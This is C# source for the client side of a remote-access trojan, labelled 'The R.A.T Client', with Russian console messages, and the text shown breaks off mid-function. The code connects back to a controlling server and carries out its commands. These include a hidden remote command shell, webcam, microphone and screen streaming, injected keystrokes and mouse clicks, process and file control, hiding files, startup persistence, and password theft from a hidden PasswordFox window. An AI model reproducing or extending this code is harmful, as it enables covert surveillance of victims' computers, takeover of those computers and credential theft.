﻿#undef EnableAutoBypass
#undef HideWindow
using AForge.Video; //For webcam streaming
using AForge.Video.DirectShow; //For webcam streaming
using appCom; //For communication with the proxy server
using System; // For basic system functions
using System.Collections.Generic; //For dictrionary and list objects
using System.Diagnostics; //For process management
using System.Drawing; //For graphics
using System.IO; //For file operations
using System.Management; //For creating shortcut (.lnk) files
using System.Net; //For network information
using System.Net.Security;
using System.Net.Sockets; //For client sockets
using System.Runtime.InteropServices; //For p/invokes
using System.Security.Cryptography; //For encrypt and decrypt
using System.Security.Cryptography.X509Certificates;
using System.Text; //For encoding
using System.Threading; //For threads
using System.Threading.Tasks;
using System.Windows.Forms; //For form fucntions
using UrlHistoryLibrary; //For reading IE's history file

/// <summary>
/// The R.A.T Client
/// </summary>
namespace TutClient
{
    /// <summary>
    /// The main module
    /// </summary>
    partial class Program
    {
        /// <summary>
        /// Frame rate control variable
        /// </summary>
        private static int fps = 100;

        /// <summary>
        /// MCI Send String for openind the CD Tray
        /// </summary>
        /// <param name="lpstrCommand">Command</param>
        /// <param name="lpstrReturnString">Return Value</param>
        /// <param name="uReturnLength">Return value's length</param>
        /// <param name="hwndCallback">Callback's handle</param>
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
        public static extern void mciSendStringA(string lpstrCommand,
            string lpstrReturnString, int uReturnLength, int hwndCallback);
        /// <summary>
        /// Find window for reading data from PasswordFox
        /// </summary>
        /// <param name="className">Window's class name</param>
        /// <param name="windowText">The text of the window</param>
        /// <returns>The handle of the window</returns>
        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);
        /// <summary>
        /// Show Window for hiding password fox's window, while still reading passwords from it
        /// </summary>
        /// <param name="hwnd">The handle of the window</param>
        /// <param name="command">The command to send</param>
        /// <returns>The success</returns>
        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);
        /// <summary>
        /// Find a child window, for PF's listView
        /// </summary>
        /// <param name="hWnd1">The handle of the parent window</param>
        /// <param name="hWnd2">The handle of the control to get the next child after</param>
        /// <param name="lpsz1">The class of the window</param>
        /// <param name="lpsz2">The text of the window</param>
        /// <returns></returns>
        [DllImport("User32.dll")]
        private static extern int FindWindowEx(int hWnd1, int hWnd2, string lpsz1, string lpsz2);
        /// <summary>
        /// Detect shutdown, logout ctrl c, and other signals to notify the server when disconnecting
        /// </summary>
        /// <param name="handler">The event handler to attach</param>
        /// <param name="add">True if the event handler should be added, otherwise false</param>
        /// <returns>The success</returns>
        [DllImport("Kernel32")]
        private static extern bool SetConsoleCtrlHandler(EventHandler handler, bool add);
        /// <summary>
        /// Generate a mouse event
        /// </summary>
        /// <param name="dwFlags">The ID of the click to do</param>
        /// <param name="dx"></param>
        /// <param name="dy"></param>
        /// <param name="dwData"></param>
        /// <param name="dwExtraInfo"></param>
        [DllImport("user32.dll")]
        static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);

        /// <summary>
        /// Signal Event Handler
        /// </summary>
        /// <param name="sig">The signal sent by the OS</param>
        /// <returns>True if the signal is handled</returns>
        private delegate bool EventHandler(CtrlType sig);
        /// <summary>
        /// New signal handler
        /// </summary>
        static EventHandler _handler;

        /// <summary>
        /// Shutdown signal types
        /// </summary>
        enum CtrlType
        {
            /// <summary>
            /// Control + C pressed
            /// </summary>
            CTRL_C_EVENT = 0,
            /// <summary>
            /// Break pressed
            /// </summary>
            CTRL_BREAK_EVENT = 1,
            /// <summary>
            /// Window closed
            /// </summary>
            CTRL_CLOSE_EVENT = 2,
            /// <summary>
            /// User logged off
            /// </summary>
            CTRL_LOGOFF_EVENT = 5,
            /// <summary>
            /// User stopped the OS
            /// </summary>
            CTRL_SHUTDOWN_EVENT = 6
        }

        /// <summary>
        /// R.A.T Remote Error Codes
        /// </summary>
        public enum ErrorType
        {
            /// <summary>
            /// File can't be located
            /// </summary>
            FILE_NOT_FOUND = 0x00,
            /// <summary>
            /// Access to process is denied, when killing
            /// </summary>
            PROCESS_ACCESS_DENIED = 0x01,
            /// <summary>
            /// Cannot encrypt data
            /// </summary>
            ENCRYPT_DATA_CORRUPTED = 0x02,
            /// <summary>
            /// Cannot decrypt data
            /// </summary>
            DECRYPT_DATA_CORRUPTED = 0x03,
            /// <summary>
            /// Cannot find the specified directory
            /// </summary>
            DIRECTORY_NOT_FOUND = 0x04,
            /// <summary>
            /// Invalid device selected with mic or cam stream
            /// </summary>
            DEVICE_NOT_AVAILABLE = 0x05,
            /// <summary>
            /// Password recovery failed
            /// </summary>
            PASSWORD_RECOVERY_FAILED = 0x06,
            /// <summary>
            /// Error, when reading from the remote CMD module
            /// </summary>
            CMD_STREAM_READ = 0X07,
            /// <summary>
            /// Cannot find specified path
            /// </summary>
            FILE_AND_DIR_NOT_FOUND = 0x08,
            /// <summary>
            /// Specified file already exists
            /// </summary>
            FILE_EXISTS = 0x09,
            /// <summary>
            /// Elevated privileges are required to run this module
            /// </summary>
            ADMIN_REQUIRED = 0x10
        }

        /// <summary>
        /// Custom signal handler
        /// </summary>
        /// <param name="sig">The incoming signal</param>
        /// <returns>True if the signal is handled</returns>
        private static bool Handler(CtrlType sig)
        {
            //In every case shutdown existing IPC connections and notify the server of the disconnect

            if (sig == CtrlType.CTRL_C_EVENT || sig == CtrlType.CTRL_LOGOFF_EVENT || sig == CtrlType.CTRL_SHUTDOWN_EVENT || sig == CtrlType.CTRL_CLOSE_EVENT)
            {
                StopIPCHandler();
                SendCommand("dclient");
                return true;
            }
            else return false;
        }

        /// <summary>
        /// Show window code -> HIDE
        /// </summary>
        private
        const int SW_HIDE = 0;
        /// <summary>
        /// Show window code -> SHOW
        /// </summary>
        private
        const int SW_SHOW = 1;

        /// <summary>
        /// The client socket
        /// </summary>
        private static Socket _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

        /// <summary>
        /// The port to connect to
        /// </summary>
        private
        const int _PORT = 100; // same as server port

        /// <summary>
        /// STDOUT from remote CMD
        /// </summary>
        private static StreamReader fromShell;
        /// <summary>
        /// STDIN to remote CMD
        /// </summary>
        private static StreamWriter toShell;
        /// <summary>
        /// STDERR from remote CMD
        /// </summary>
        private static StreamReader error;

        private static bool isDisconnect = false;
        private static NAudio.Wave.WaveInEvent streaming;
        private static VideoCaptureDevice source;
        private static Process cmdProcess;
        private static Client _ipcClient;
        private static ProcessData ipcProcess;
        private static string getScreens; //get screens count
        private static int screenNumber = 0;
        private static Encoding encoder;
        private static SslStream sslClient;
        private static string localIPCache = string.Empty;
        private static string localAVCache = string.Empty;
        private static string ip = null;

        public static int Fps { get => fps; set => fps = value; }

        public static string GetIp()
        {
            return ip;
        }

        public static void SetIp(string value)
        {
            ip = value;
        }

        public static Encoding GetEncoder()
        {
            return encoder;
        }

        public static void SetEncoder(Encoding value)
        {
            encoder = value;
        }

        public static SslStream GetSslClient()
        {
            return sslClient;
        }

        public static void SetSslClient(SslStream value)
        {
            sslClient = value;
        }

        public static int GetScreenNumber()
        {
            return screenNumber;
        }

        public static void SetScreenNumber(int value)
        {
            screenNumber = value;
        }

        public static string GetLocalIPCache()
        {
            return localIPCache;
        }

        public static void SetLocalIPCache(string value)
        {
            localIPCache = value;
        }

        public static string GetLocalAVCache()
        {
            return localAVCache;
        }

        public static void SetLocalAVCache(string value)
        {
            localAVCache = value;
        }

        /// <summary>
        /// R.A.T Entry point
        /// </summary>
        /// <param name="args">Command-Line arguments</param>
        static void Main(string[] args)
        {
#if HideWindow
            if (applicationHidden) ShowWindow(Process.GetCurrentProcess().MainWindowHandle.ToInt32(), SW_HIDE); //Hide application if specified
#endif
            _handler += new EventHandler(Handler); //Create a new handler
            SetConsoleCtrlHandler(_handler, true); //Assign the custom handler function
            ServicePointManager.UseNagleAlgorithm = false; //Disable Nagle algorithm (Short Quick TCP packets don't get collected sent at once)
            A:
            try
            {
                Console.WriteLine("Введите ip адрес или домен для подключения!");
                SetIp(Console.ReadLine());
                ConnectToServer(GetIp()); //Connect to the R.A.T Server
            }
            catch
            {
                Console.Clear();
#pragma warning disable S907 // "goto" statement should not be used
                goto A;
#pragma warning restore S907 // "goto" statement should not be used
            }
            StartIPCHandler(); //Start IPC Manager
            RequestLoop(); //Request command from the server
        }

        /// <summary>
        /// Stop the IPC Handler and kill out client
        /// </summary>
        private static void StopIPCHandler()
        {
            if (_ipcClient == null) return; //Check if the client is running
            _ipcClient.StopPipe(); //Stop the client
            _ipcClient = null; //Set the client to null
        }

        /// <summary>
        /// Start handling IPC connections
        /// </summary>
        private static void StartIPCHandler()
        {
            Client ipcClient = new Client(); //Create a new IPC client
            ipcClient.OnMessageReceived += new Client.OnMessageReceivedEventHandler(ReadIPC); //Subscribe to the message receiver
            _ipcClient = ipcClient; //Set the global client
        }

        /// <summary>
        /// Start IPC Child processes
        /// </summary>
        /// <param name="servername">The server to start</param>
        private static void LaunchIPCChild(string servername)
        {
            string filepath = ""; //The path to the server's exe file
            if (servername == "tut_client_proxy") //If the proxy server is specified
            {
                filepath = @"proxy\proxyServer.exe"; //Set the proxy server's path
            }

            ProcessData tempProcess = ProcessData.CheckProcessName("proxyServer", "tut_client_proxy"); //Get the process data of the proxySevrer
            ipcProcess = tempProcess; //Set the global IPC Process

            if ((ipcProcess != null && !ipcProcess.IsPipeOnline("tut_client_proxy")) || ipcProcess == null) //Check if the server is offline
            {
                Process p = new Process(); //Create a new process object
                p.StartInfo.FileName = filepath; //Set the exe path
                p.StartInfo.Arguments = "use_ipc"; //Specify the IPC flag for the proxy
                p.Start(); //Start the proxy Server
                ipcProcess = new ProcessData(p.Id, "tut_client_proxy"); //Get a new process data
                Thread.Sleep(1500); //Wait for the server to start
            }

            _ipcClient.ConnectPipe("tut_client_proxy", 0); //Connect to the server
        }

        /// <summary>
        /// IPC Receive Messages Callback
        /// </summary>
        /// <param name="e">Message event args</param>
        private static void ReadIPC(ClientMessageEventArgs e)
        {
            string msg = e.Message; //Get the message
            Console.WriteLine("IPC Сообщение: " + msg);
            SendCommand("ipc§" + "tut_client_proxy" + "§" + msg); //Forward output to R.A.T Server
        }

        /// <summary>
        /// Resolve a DNS name into an IP Address
        /// </summary>
        /// <param name="input">The DNS name to resolve</param>
        /// <returns>The IP Address if resolvation is successful, otherwise null</returns>
        private static string ResolveDns(string input)
        {
            try
            {
                string ipAddr = Dns.GetHostAddresses(input)[0].ToString(); //Try to get the first result
                return ipAddr; //Return the IP Address
            }
            catch (Exception ex) //Something went wrong
            {
                Console.WriteLine("Разрешение DNS при вводе: " + input + " - неудачно\r\n" + ex.Message);
                return null; //Return null
            }
        }

        /// <summary>
        /// Convert a connection string to an IP Address
        /// </summary>
        /// <param name="input">The connection string</param>
        /// <returns>The IP Address of the R.A.T Server if can be parsed, otherwise false</returns>
        private static string GetIPAddress(string input)
        {
            if (input == "") return null; //Filter empty input
            bool validIP = true; //True if input is a valid IP

            if (input.Contains(".")) //Input contains dots
            {
                string[] parts = input.Split('.'); //Get the octects
                if (parts.Length == 4) //If 4 octets present
                {
                    foreach (string ipPart in parts) //Loop throught them
                    {
                        for (int i = 0; i < ipPart.Length; i++) //Check char by char
                        {
                            if (!char.IsNumber(ipPart[i])) //If char isn't a nuber, then input isn't an IP
                            {
                                validIP = false; //Invalid for IP
                                break; //Break out
                            }
                        }

                        if (!validIP) //Invalid IP Address
                        {
                            Console.WriteLine("Неверный IP-адрес!\r\nВвод не является IP-адресом");
                            break; //Break
                        }
                    }

                    if (validIP) //IP was valid
                    {
                        return input; //Return the IP
                    }
                    else //Invalid IP
                    {
                        //Pretend that the input is a hostname
                        return ResolveDns(input);
                    }
                }
                else //input doesn't have 4 parts, but it can be still a hostname
                {
                    return ResolveDns(input); //Get the IP of the DNS name
                }
            }

            return null; //All parsing failed at this point
        }

        /// <summary>
        /// Connect to the R.A.T Server
        /// </summary>
        private static void ConnectToServer(string ip)
        {
            int attempts = 0; //Connection attempts to the server
            string ipCache = GetIPAddress(ip); //Replace IP with DNS if you want
            SetEncoder(Encoding.Unicode);

            while (!_clientSocket.Connected) //Connect while the client isn't connected
            {
                try
                {
                    attempts++; //1 more attempt
                    Console.WriteLine("Попытка соединения.. (" + attempts + ")");

                    _clientSocket.Connect(IPAddress.Parse(ipCache), _PORT); //Try to connect to the server
                    Thread.Sleep(500);
                }
                catch (SocketException) //Couldn't connect to server
                {
                    if (attempts % 5 == 0) ipCache = GetIPAddress(ip); // Update ip cache every 5 failed attempts
                    //Shutdown the remote desktop
                    if (!RDesktop.isShutdown)
                    {
                        RDesktop.isShutdown = true;
                    }
                    Console.Clear();
                }
            }

            Console.Clear();
            Console.WriteLine("Подключено!"); //Client connected
        }

        /// <summary>
        /// Read commands from the server
        /// </summary>
        private static void RequestLoop()
        {
            while (true) //While the connection is alive
            {
                if (isDisconnect) break; //If we need to disconnect, then break out
                ReceiveResponse(); // Receive data from the server
            }

            Console.WriteLine("Соединение сброшено."); //Disconnected at this point
            //Shutdown the client, then reconnect to the server
            _clientSocket.Shutdown(SocketShutdown.Both);
            _clientSocket.Close();
            _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            ConnectToServer(GetIp());
            isDisconnect = false;
            RequestLoop();
        }


        /// <summary>
        /// Report a client-side error to the R.A.T Server
        /// </summary>
        /// <param name="type">The error type/code</param>
        /// <param name="title">The short title of the error</param>
        /// <param name="message">The longer message of the error</param>
        public static void ReportError(ErrorType type, string title, string message)
        {
            new StringBuilder().Append("error§")
                .Append(type).Append("§")
                .Append(title).Append("§")
                .Append(message);
            SendCommand(new StringBuilder().ToString()); //Send to server
        }

        /// <summary>
        /// Get commands from multiple TCP packets incoming as one
        /// </summary>
        /// <param name="rawData">The string converted incoming data</param>
        /// <returns>An array of command sent by the server</returns>
        private static string[] GetCommands(string rawData)
        {
            List<string> commands = new List<string>(); //The command sent by the server
            int readBack = 0; //How much to read back from the current char pointer

            for (int i = 0; i < rawData.Length; i++) // Go through the message
            {
                char current = rawData[i]; //Get the current character
                if (current == '§') //If we see this char -> message delimiter
                {
                    int dataLength = int.Parse(rawData.Substring(readBack, i - readBack)); //Get the length of the command string
                    string command = rawData.Substring(i + 1, dataLength); //Get the command string itself
                    i += 1 + dataLength; //Skip the current command
                    readBack = i; //Set the read back point to here
                    commands.Add(command); //Add this command to the list
                }
            }

            return commands.ToArray(); //Return the command found
        }

        /// <summary>
        /// Handle the commands from the server
        /// </summary>
        /// <param name="text">The plaintext command message</param>
        private static void HandleCommand(string text)
        {
            if (text == "tskmgr") // i added this to start task manager
            {
                Process p = new Process(); //Create a new process object
                p.StartInfo.FileName = "Taskmgr.exe"; //Task Manager
                p.StartInfo.CreateNoWindow = true; //Don't draw the window of the task manager
                p.Start(); //Start the process
            }
            else if (text == "fpslow") //FPS 
            {
                Fps = 150;
            }
            else if (text == "fpsbest") //FPS 
            {
                Fps = 80;
            }
            else if (text == "fpshigh") //FPS
            {
                Fps = 50;
            }
            else if (text == "fpsmid") //FPS 
            {
                Fps = 100;
            }
            else if (text.StartsWith("getinfo-")) //Server requested info
            {
                string myid = text.Substring(8); //get the client id
                StringBuilder command = new StringBuilder();
                command.Append("infoback;")
                    .Append(myid).Append(";")
                    .Append(Environment.MachineName).Append("|")
                    .Append(GetLocalIPAddress()).Append("|")
                    .Append(DateTime.Now.ToString()).Append("|")
                    .Append(AvName());
                SendCommand(command.ToString()); //Send the response to the server
            }
            else if (text.StartsWith("msg")) //Display a messagebox
            {
                CreateMessage(text.Split('|')); //Parse the data and show the messagebox
            }
            else if (text.StartsWith("freq-")) //Play a freuqency
            {
                int freq = int.Parse(text.Substring(5)); //Get the target frequency
                GenerateFreq(freq, 2); //Play that frequency for 2 seconds
            }
            else if (text.StartsWith("sound-")) //Play a system sound
            {
                string snd = text.Substring(6); //Get the ID of the sound
                PlaySystemSound(snd);
            }
            else if (text.StartsWith("t2s|")) //Text to speech
            {
                string txt = text.Substring(4); //Get the text to read
                T2S(txt); //Read the text
            }
            else if (text.StartsWith("cd|")) //Manipulate the CD Tray
            {
                string opt = text.Substring(4); //Get the desired state of the CD Tray

                if (opt == "open") //Open it
                {
                    mciSendStringA("set CDAudio door open", "", 127, 0);
                }
                else //Close it
                {
                    mciSendStringA("set CDAudio door closed", "", 127, 0);
                }
            }
            else if (text.StartsWith("emt|")) //Manipulate windows elements
            {
                string[] data = text.Split('|');
                string action = data[1]; //Hide/Show
                string element = data[2]; //The element to manipulate

                ShowHideElement(action, element);
            }
            else if (text == "proclist") //List the running processes
            {
                Process[] allProcess = Process.GetProcesses(); //Get the list of running processes
                StringBuilder response = new StringBuilder();

                foreach (Process proc in allProcess) //Go through the processes
                {
                    response.Append("setproc|")
                        .Append(proc.ProcessName).Append("|") //Get the name of the process
                        .Append(proc.Responding).Append("|") // Get if the process is responding
                        .Append(proc.MainWindowTitle == "" ? "N/A" : proc.MainWindowTitle).Append("|"); // Get the main window's title

                    string priority = "N/A";
                    string path = "N/A";

                    try
                    {
                        priority = proc.PriorityClass.ToString(); //Get process priority
                        path = proc.Modules[0].FileName; //Get process executable path
                    }
                    catch (Exception) // 32-bit can't get 64-bit processes path / non-admin rights catch
                    { 
                        //do nothing
                    }

                    response.Append(priority).Append("|")
                        .Append(path).Append("|")
                        .Append(proc.Id).Append("\n"); //Get the ID of the process
                }

                SendCommand(response.ToString()); //Send the response to the server
            }
            else if (text.StartsWith("prockill")) //Kill a process
            {
                int id = int.Parse(text.Substring(9)); //Get the ID of the process ot kill
                try
                {
                    Process.GetProcessById(id).Kill(); //Try to kill the process
                }
                catch (Exception) //Failed to kill it
                {
                    ReportError(ErrorType.PROCESS_ACCESS_DENIED, "Не могу убить процесс", "Клиент не смог убить процесс: " + id); //Report to the server
                }
            }
            else if (text.StartsWith("procstart")) //Create a new process
            {
                try
                {
                    string[] data = text.Split('|');
                    Process p = new Process(); //Create the new process's object

                    p.StartInfo.FileName = data[1]; //Set the file to start

                    // Set the window style of the process
                    if (data[2] == "hidden") p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; // Check the window style of the process to start
                    // Normal window style is set by default, no need of else

                    p.Start(); //Start the process
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            else if (text == "startcmd") //Start the remote cmd module
            {
                ProcessStartInfo info = new ProcessStartInfo
                {
                    FileName = "cmd.exe", //Set the file to cmd
                    CreateNoWindow = true, //Don't draw a window for it
                    UseShellExecute = false, //Don't use shell execution (needed to redirect the stdout, stdin and stderr)
                    RedirectStandardInput = true, //Redirect stdin
                    RedirectStandardOutput = true, //Redirect stdout
                    RedirectStandardError = true //Redirect stderr
                }; //Create a new startinfo object

                cmdProcess = new Process
                {
                    StartInfo = info
                }; //Create a new process object
                cmdProcess.Start(); //Start the cmd
                toShell = cmdProcess.StandardInput; //Get the stdin
                fromShell = cmdProcess.StandardOutput; //Get the stdout
                error = cmdProcess.StandardError; //Get the stderr
                toShell.AutoFlush = true; //Enable auto flushing

                // Get stdout and stderr from the shell
                GetShellOutput();
            }
            else if (text == "stopcmd") //Stop the remote cmd module
            {
                cmdProcess.Kill(); //Kill the process
                //Dispose the streams and the process itself
                toShell.Dispose();
                toShell = null;
                fromShell.Dispose();
                fromShell = null;
                cmdProcess.Dispose();
                cmdProcess = null;
            }
            else if (text.StartsWith("cmd§")) //Send command to the remote cmd module
            {
                string command = text.Substring(4); //The command to enter
                toShell.WriteLine(command + "\r\n"); //Send the command
            }
            else if (text == "fdrive") //List PC drives
            {
                DriveInfo[] drives = DriveInfo.GetDrives(); //Get the drives on the machine

                StringBuilder response = new StringBuilder();
                response.Append("fdrivel§");

                foreach (DriveInfo d in drives) //Go thorugh the drives
                {
                    if (d.IsReady) //Drive is ready (browsable)
                    {
                        // Get the name and size of the drive
                        response.Append(d.Name).Append("|")
                            .Append(d.TotalSize.ToString()).Append("\n");
                    }
                    else //Drive is not ready
                    {
                        // Get the name of the drive
                        response.Append(d.Name).Append("\n");
                    }
                }

                SendCommand(response.ToString()); //Respond to the server
            }
            else if (text.StartsWith("fexec§")) //Execute a file
            {
                string path = text.Substring(6); //The path to execute
                if (!File.Exists(path) && !Directory.Exists(path)) //Invalid path
                {
                    ReportError(ErrorType.FILE_NOT_FOUND, "Не могу запустить " + path, "Клиент не может обнаружить файл"); //Report to server
                    return;
                }
                Process.Start(path); //Execute the file
            }
            else if (text.StartsWith("fhide§")) //Set the hidden attribute for a file
            {
                string path = text.Substring(6); //The file to hide
                if (!File.Exists(path) && !Directory.Exists(path)) //Invalid path
                {
                    ReportError(ErrorType.FILE_AND_DIR_NOT_FOUND, "Не могу спрятать файл!", "Клиент не обнаружил " + path); //Report to the server
                    return;
                }
                File.SetAttributes(path, FileAttributes.Hidden); //Hide the file
            }
            else if (text.StartsWith("fshow§")) //Remove the hidden attribute from a file
            {
                String path = text.Substring(6); //The path of the file
                if (!File.Exists(path) && !Directory.Exists(path)) //Path is invalid
                {
                    ReportError(ErrorType.FILE_AND_DIR_NOT_FOUND, "Не могу спрятать файл!", "Клиент не обнаружил " + path); //Report error to server
                    return;
                }
                File.SetAttributes(path, FileAttributes.Normal); //Set the file attributes to normal
            }
            else if (text == "dc") //Server disconnected us
            {
                Thread.Sleep(3000); //Wait for the server to restart
                isDisconnect = true; //Set request breaking to true
                StopIPCHandler(); //Stop IPC connections
            }
            else if (text == "rdstart") //Start a remote desktop session
            {
                Thread rd = new Thread(new ThreadStart(RDesktop.StreamScreen)); //Create a new thread for the remote desktop
                RDesktop.isShutdown = false; //Enable the remote desktop to run
                rd.Start(); //Start the remote desktop
            }
            else if (text == "rdstop") //Stop the remote desktop
            {
                RDesktop.isShutdown = true; //Disable the remote desktop
            }
            else if (text.StartsWith("rmove-")) //Move the mouse
            {
                string t = text.Substring(6); //Get the command parts
                string[] x = t.Split(':'); //Get the coordinate parts
                Cursor.Position = new Point(int.Parse(x[0]), int.Parse(x[1])); //Set the position of the mouse
            }
            else if (text.StartsWith("rtype-")) //Type with the keyboard
            {
                string t = text.Substring(6); //Get the command parts
                if (t != "")
                {
                    SendKeys.SendWait(t); //Send the key to the OS

                    SendKeys.Flush(); //Flush to don't store the keys in a buffer
                }
            }
            else if (text.StartsWith("rclick-")) //Click with the mouse
            {
                string[] t = text.Split('-'); //Get the command parts
                MouseEvent(t[1], t[2]); //Generate a new mouse event
            }
            else if (text == "alist") //List the installed audio input devices
            {
                StringBuilder listing = new StringBuilder();
                listing.Append("alist");

                for (int i = 0; i < NAudio.Wave.WaveIn.DeviceCount; i++) //Loop through the devices
                {
                    // Get the device info
                    NAudio.Wave.WaveInCapabilities c = NAudio.Wave.WaveIn.GetCapabilities(i);
                    // Add the device to the listing
                    listing.Append(c.ProductName).Append("|")
                        .Append(c.Channels.ToString()).Append("§");
                }

                // Get and format the response
                string resp = listing.ToString();
                if (resp.Length > 0) resp = resp.Substring(0, resp.Length - 1);
                SendCommand(resp); //Send response to the server
            }
            else if (text.StartsWith("astream")) //Start streaming audio
            {
                try
                {
                    int deviceNumber = int.Parse(text.Substring(8)); //Convert the number to int
                    NAudio.Wave.WaveInEvent audioSource = new NAudio.Wave.WaveInEvent
                    {
                        DeviceNumber = deviceNumber, //The device ID
                        WaveFormat = new NAudio.Wave.WaveFormat(44100, NAudio.Wave.WaveIn.GetCapabilities(deviceNumber).Channels) //The format of the wave
                    }; //Create a new wave reader
                    audioSource.DataAvailable += new EventHandler<NAudio.Wave.WaveInEventArgs>(SendAudio); //Attach to new audio event
                    streaming = audioSource; //Set the global audio source
                    audioSource.StartRecording(); //Start receiving data from mic
                }
                catch (Exception) //Wrong device ID
                {
                    ReportError(ErrorType.DEVICE_NOT_AVAILABLE, "Не могу прослушивать микрофон!", "Устройство недоступно!"); //Report error to the server
                }
            }
            else if (text == "astop") //Stop streaming audio
            {
                streaming.StopRecording(); //Stop receiving audio from the mic
                streaming.Dispose(); //Dispose the audio input
                streaming = null;
            }
            else if (text == "wlist") //List the camera devices
            {
                FilterInfoCollection devices = new FilterInfoCollection(FilterCategory.VideoInputDevice); //Get the video input devices on this machine
                int i = 0; //Count of the devices
                StringBuilder listing = new StringBuilder();
                listing.Append("wlist"); // Add response header

                foreach (FilterInfo device in devices) //Go through the devices
                {
                    // Append the device ID and the name of the device
                    listing.Append(i.ToString()).Append("|")
                        .Append(device.Name).Append("§");
                    i++; //Increment the ID
                }

                // Get and format the listing
                string resp = listing.ToString();
                if (resp.Length > 0) resp = resp.Substring(0, resp.Length - 1); //remove the split char ('§') from the end
                SendCommand(resp); //Send response to the server
            }
            else if (text.StartsWith("wstream")) //Stream camera
            {
                int id = int.Parse(text.Substring(8)); //The ID of the device to stream the image of

                FilterInfoCollection devices = new FilterInfoCollection(FilterCategory.VideoInputDevice); //Get all video input devices
                if (devices.Count == 0) //No devices
                {
                    ReportError(ErrorType.DEVICE_NOT_AVAILABLE, "Не могу смотреть камеру!", "Устройство не найдено или не подключено!"); //Report error to the server
                    return;
                }
                int i = 0;
                FilterInfo dName = new FilterInfo(""); //Create a new empty device

                foreach (FilterInfo device in devices) //Loop through the video devices
                {
                    if (i == id) //If the IDs match
                    {
                        dName = device; //Set the device
                        break;
                    }
                    i++; //Increment the ID
                }
                source = new VideoCaptureDevice(dName.MonikerString); //Get the capture device
                source.NewFrame += new NewFrameEventHandler(Source_NewFrame); //Attach a new image handler
                source.Start(); //Start receiving images from the camera
            }
            else if (text == "wstop") //Stop the camera stream
            {
                source.Stop(); //Stop receiving images from the camera
                source = null;
            }
            else if (text == "getstart") //Get the startup folder of the client
            {
                SendCommand("setstart§" + Application.StartupPath); //Send it to the server
            }
            else if (text.StartsWith("writeipc§")) //Write to a process with remote IPC
            {
                string idAndMessage = text.Substring(text.IndexOf('§') + 1); //Get command parameters
                string message = idAndMessage.Substring(idAndMessage.IndexOf('§') + 1); //Get the message to send
                _ipcClient.WriteStream(message); //Sen the message to the IPC server
            }
            else if (text.StartsWith("startipc§")) //Start a new IPC connection
            {
                string servername = text.Substring(text.IndexOf('§') + 1); //The server to start
                StartIPCHandler(); //Start the handler
                LaunchIPCChild(servername); //Launch the child process
            }
            else if (text.StartsWith("stopipc§")) //Stop IPC connections
            {
                StopIPCHandler(); //Disconnect from the IPC server
            }
            else if (text == "countScreens") //Get the available screens on the machine
            {
                foreach (Screen screen in Screen.AllScreens) //Loop through screens
                {
                    getScreens = screen.DeviceName.Replace("\\\\.\\DISPLAY", ""); //Get the ID of the screen

                    SendCommand("ScreenCount" + getScreens); //Send the screen ID to the server
                }
            }
            else if (text.StartsWith("screenNum")) //Set the screen ID to view during the remote desktop session
            {
                SetScreenNumber(int.Parse(text.Substring(9)) - 1); //because the screens start at 0 not 1 
            }
            else if (text.StartsWith("sprobe§")) //Probe startup options
            {
                string method = text.Substring(7); //Get the probing method
                const UAC.ProbeMethod startUpFolder = UAC.ProbeMethod.StartUpFolder;
                UAC.ProbeMethod pm = startUpFolder; //Declare a probing method

                //Parse the method to use
                if (method == "Registry") pm = UAC.ProbeMethod.Registry;
                else if (method == "Task Scheduler") pm = UAC.ProbeMethod.TaskScheduler;
                else if (method == "Startup Folder") pm = UAC.ProbeMethod.StartUpFolder;
                else return;

                UAC uac = new UAC(); //Create a new UAC module
                uac.ProbeStart(pm); //Probe the startup using the selected method
            }
        }

        /// <summary>
        /// Show or Hide one of the pre-configured desktop elements
        /// </summary>
        /// <param name="action">Hide or Show</param>
        /// <param name="element">The name of the element</param>
        private static void ShowHideElement(string action, string element)
        {
            //Determine the element and show/hide it
            switch (element)
            {
                case "task":

                    if (action == "hide")
                    {
                        HTaskBar();
                    }
                    else
                    {
                        STaskBar();
                    }

                    break;

                case "clock":

                    if (action == "hide")
                    {
                        HClock();
                    }
                    else
                    {
                        SClock();
                    }

                    break;

                case "tray":

                    if (action == "hide")
                    {
                        HTrayIcons();
                    }
                    else
                    {
                        STrayIcons();
                    }

                    break;

                case "desktop":

                    if (action == "hide")
                    {
                        HDesktop();
                    }
                    else
                    {
                        SDesktop();
                    }

                    break;

                case "start":

                    if (action == "hide")
                    {
                        HStart();
                    }
                    else
                    {
                        SStart();
                    }

                    break;
            }
        }

        /// <summary>
        /// Play a system sound
        /// </summary>
        /// <param name="snd">The system sound to play</param>
        private static void PlaySystemSound(string snd)
        {
            System.Media.SystemSound sound; //Create a sound var

            //Parse the ID to actual sound object
            switch (snd)
            {
                case "0":
                    sound = System.Media.SystemSounds.Beep;
                    break;

                case "1":
                    sound = System.Media.SystemSounds.Hand;
                    break;

                case "2":
                    sound = System.Media.SystemSounds.Exclamation;
                    break;

                default:
                    sound = System.Media.SystemSounds.Asterisk;
                    break;
            }

            sound.Play(); //Play the system sound
        }

        /// <summary>
        /// Read data from the server
        /// </summary>
        private static void ReceiveResponse()
        {
            byte[] buffer = new byte[2048];

            try
            {
                int received = 0;
                received = _clientSocket.Receive(buffer, SocketFlags.None);
                if (received == 0) return;
                byte[] data = new byte[received];
                Array.Copy(buffer, data, received);

                string text = GetEncoder().GetString(data);
                string[] commands = GetCommands(text);

                foreach (string cmd in commands)
                {
                    HandleCommand(Decrypt(cmd));
                }
            }
            catch (SocketException ex)
            {
                if (ex.SocketErrorCode == SocketError.ConnectionReset ||
                    ex.SocketErrorCode == SocketError.ConnectionAborted)
                {
                    Console.WriteLine("Соединение было разорвано из-за принудительного выключения сервера.");
                    RDesktop.isShutdown = true;
                    Console.WriteLine("Программа экстренно перезапускается...");

                    isDisconnect = true;
                    //Process.Start(System.Reflection.Assembly.GetExecutingAssembly().Location);
                    //Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine(ex.Message);
                    RDesktop.isShutdown = true;
                    Console.WriteLine("Соединение прервано.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
